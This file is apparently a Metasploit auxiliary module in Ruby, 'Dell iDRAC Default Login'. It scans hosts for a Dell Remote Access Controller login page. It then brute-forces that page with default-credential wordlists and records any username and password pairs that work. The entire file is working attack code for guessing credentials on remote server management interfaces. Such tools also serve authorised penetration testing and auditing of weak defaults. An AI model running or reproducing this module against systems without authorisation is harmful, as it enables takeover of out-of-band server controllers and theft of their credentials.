##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Dell iDRAC Default Login',
      'Description' => %q{
        This module attempts to login to a iDRAC webserver instance using
        default username and password.  Tested against Dell Remote Access
        Controller 6 - Express version 1.50 and 1.85
      },
      'Author' =>
        [
          'Cristiano Maruti <cmaruti[at]gmail.com>'
        ],
      'References' =>
        [
          ['CVE', '1999-0502'] # Weak password
        ],
      'License' => MSF_LICENSE
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Path to the iDRAC Administration page', '/data/login']),
      OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
        File.join(Msf::Config.data_directory, "wordlists", "idrac_default_user.txt") ]),
      OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
        File.join(Msf::Config.data_directory, "wordlists", "idrac_default_pass.txt") ]),
      OptInt.new('RPORT', [true, "Default remote port", 443])
    ], self.class)

    register_advanced_options([
      OptBool.new('SSL', [true, "Negotiate SSL connection", true])
    ], self.class)
  end

  def target_url
    proto = "http"
    if rport == 443 or ssl
      proto = "https"
    end
    uri = normalize_uri(datastore['URI'])
    "#{proto}://#{vhost}:#{rport}#{uri}"
  end

  def do_login(user=nil, pass=nil)

    uri = normalize_uri(target_uri.path)
    auth = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'SSL' => true,
      'vars_post' => {
        'user' => user,
        'password' => pass
      }
    })

    if(auth and auth.body.to_s.match(/<authResult>[0|5]<\/authResult>/) != nil )
      print_good("#{target_url} - SUCCESSFUL login for user '#{user}' with password '#{pass}'")
      report_auth_info(
        :host => rhost,
        :port => rport,
        :proto => 'tcp',
        :sname => (ssl ? 'https' : 'http'),
        :user => user,
        :pass => pass,
        :active => true,
        :source_type => "user_supplied",
        :duplicate_ok => true
      )
    else
      print_error("#{target_url} - Dell iDRAC - Failed to login as '#{user}' with password '#{pass}'")
    end
  end

  def run_host(ip)
    print_status("Verifying that login page exists at #{ip}")
    uri = normalize_uri(target_uri.path)
    begin
      res = send_request_raw({
        'method' => 'GET',
        'uri' => uri
        })

      if (res and res.code == 200 and res.body.to_s.match(/<authResult>1/) != nil)
        print_status("Attempting authentication")

        each_user_pass { |user, pass|
          do_login(user, pass)
        }

      elsif (res and res.code == 301)
        print_error("#{target_url} - Page redirect to #{res.headers['Location']}")
        return :abort
      else
        print_error("The iDRAC login page does not exist at #{ip}")
        return :abort
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    rescue ::OpenSSL::SSL::SSLError => e
      return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted
    end
  end

end
